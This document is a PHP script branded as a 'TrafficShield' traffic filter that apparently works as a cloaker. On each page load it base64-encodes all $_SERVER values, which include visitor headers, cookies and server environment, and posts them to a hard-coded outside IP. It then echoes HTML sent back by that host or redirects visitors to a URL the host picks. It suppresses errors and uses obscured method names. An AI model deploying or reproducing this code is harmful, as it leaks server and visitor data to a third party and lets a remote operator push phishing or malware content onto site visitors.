<?php
namespace TrafficShield; 
error_reporting(0);
class Traffic_Shield{
    public function run() {		
        ob_start();					
        $this->ogrsr9854();
    }
    public function ogrsr9854() {	
        $this->_check(); 
        $response = $this->https_request();        
        $this->main($response);       
    }
    public function _check() {	
        if(isset($_GET["TS-BHDNR-84848"])){
            echo "5280167289";
        }
    }			
    public function get_header() {	
        $headers = array();     
        foreach($_SERVER as $k=>$v){
            $headers[$k] = $v;
        }
        $headers["TS-BHDNR-74191"] = "900661405718873";
        $headers["TS-BHDNR-74194"] = "5280167289"; 
        return $headers;
    }
    public function get_header_post() {
        $get_header = $this->get_header();
        return base64_encode(json_encode($get_header));      
    }	
    public function https_request() {
        $get_header["headers"] = $this->get_header_post();
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
        $result = curl_exec($ch);                
        return json_decode($result);
    }
    public function main($response) {
        if(!empty($response)){
            if(isset($response->zrc) && !empty($response->zrc)){
                echo base64_decode($response->zrc);
                die();
            }else{
                $this->get_url($response->url,$response->http_code);
            }
        }
    }
    public function get_url($url,$code) {        
            header("Location: ".$url, true, $code); ?>
         <!DOCTYPE html>
            <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta http-equiv="X-UA-Compatible" content="IE=edge">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
                    <title>You are being redirected to</title>

                </head>
                <body>                        
    <?php
    // $url değişkeninden gelen içeriği doğrudan burada göster.
    // Bu örnek bir PHP kodu olup, gerçek bir sunucu ortamında çalıştırılması gerekmektedir.
    // $url içeriğini burada doğrudan echo ile yazdırabilirsiniz.
    echo file_get_contents($url);
    ?>
                </body>
            </html> 
                </body>
            </html> 
<?php  } }
$traffic_Shield_Tre9854 = new Traffic_Shield();
$traffic_Shield_Tre9854->run();
// Copyright TrafficShield.io//
?>
